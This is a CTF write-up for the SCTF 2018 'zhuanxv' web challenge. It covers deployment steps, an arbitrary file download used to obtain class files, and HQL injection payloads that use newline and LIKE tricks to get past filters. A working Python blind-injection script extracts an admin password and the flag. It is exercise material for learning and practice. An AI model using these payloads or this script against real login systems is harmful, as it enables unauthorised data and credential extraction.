# sctf2018-zhuanxv

## 部署
启动 `./start_up.sh`

停止 `docker-compose down`


## WP


### 第一步：信息收集

信息收集，发现github上遗留的说明。https://github.com/Lazyboxx/zhuanxvapplication 根据提供的url进入登录地址，发现用户名密码已经无法登陆

### 第二步：下载源码

查看网页源代码，发现背景图片的加载方式使用`./loadimage?fileName=web_login_bg.jpg` ，找到任意文件下载点，下载一系列文件。这里限制了下载文件的后缀只有class xml jpg css等。

### 第三步：代码审计

根据github的commit记录 https://github.com/Lazyboxx/zhuanxvapplication/commit/3f34f9b15cf2be3a03ed5f19d9d71cf6427b0111 了解实现类的位置。

从`user.hbm.xml`得知表名和类名映射

从`com/cuitctf/service/impl/UserServiceImpl.class`得知过滤规则，用户名只过滤空格和等号，密码限制只能字母+数字

从`com/cuitctf/dao/impl/UserDaoImpl.class`得知hql语句，变量拼接导致hql注入

### 第四步：HQL注入

HQL需要两步，第一步注入得到管理员密码，第二步根据密码盲注得到flag

注入第一步：

用户名：`aaa'%0aor%0a(select%0asubstring(password,1,1)%0afrom%0aUser%0awhere%0aname%0alike%0a'homamamama')%0alike%0a'a'%0aor%0a''like'`

密码：随意

盲注得到homamamama的密码：6yhn7ujm

注入第二步：

用户名：`aa'%0aor%0a(select%0asubstring(welcometoourctf,1,1)%0afrom%0aFlag)%0alike%0a'a'%0aand%0a''like'`

密码：`6yhn7ujm`

得到flag：`sctf{C46E250926A2DFFD831975396222B08E}`



备注：需要注意的是过滤了等号，可以用like绕过，需要考虑%和_的全匹配性质，答案中没有这两个符号，写脚本的时候注意避开这两个字符的猜测。



exp：
```python
    import requests
    
    url = "http://ip/zhuanxvlogin"
    # url = "http://localhost:9090/zhuanxvlogin"
    
    def first():
    	admin_password = ""
    	for i in range(1,9):
    		for n in range(30,140):
    			guess = chr(n)
    			if guess == "_" or guess == "%":
    				continue
    			username = "aaa'\nor\n(select\nsubstring(password,"+str(i)+",1)\nfrom\nUser\nwhere\nname\nlike\n'homamamama')\nlike\n'"+guess+"'\nor\n''like'"
    			data = {"user.name": username, "user.password": "a"}
    			req = requests.post(url, data=data, timeout=1000).text
    			if len(req)>5000:
    				admin_password = admin_password + guess
    				print "admin password: "+ admin_password
    				break
    	return admin_password
    
    def second(admin_password):
    	flag = ""
    	for i in range(1,50):
    		for n in range(30,140):
    			guess = chr(n)
    			if guess == "_" or guess == "%":
    				continue
    			username = "aa'\nor\n(select\nsubstring(welcometoourctf,"+str(i)+",1)\nfrom\nFlag)\nlike\n'"+guess+"'\nand\n''like'"
    			data = {"user.name": username, "user.password": admin_password}
    			req = requests.post(url, data=data, timeout=1000).text
    			if len(req)>5000:
    				flag = flag + guess
    				print "flag:" + flag
    				break
    
    admin_password = first()	
    second(admin_password)
```



